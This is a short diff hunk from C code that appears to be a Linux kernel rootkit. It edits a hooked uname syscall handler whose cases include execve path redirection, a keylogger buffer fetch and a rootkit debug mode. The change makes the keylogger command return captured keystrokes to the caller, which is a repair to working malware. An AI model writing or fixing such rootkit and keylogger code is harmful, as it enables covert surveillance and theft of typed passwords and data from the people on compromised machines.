@@ -603,7 +603,7 @@ asmlinkage long new_sys_newuname(struct new_utsname *name)
 		unredirect_path(args.p_param1, args.param2, REDIRECT_PATH_EXECVE);
 		break;
 	case SYSCALL_GET_KEYLOGGER_BUF:
-		keylogger_buffer_get(args.p_param1, args.param2);
+		return keylogger_buffer_get(args.p_param1, args.param2);
 		break;
 #ifdef DEBUG
 	case DEBUG_RK:
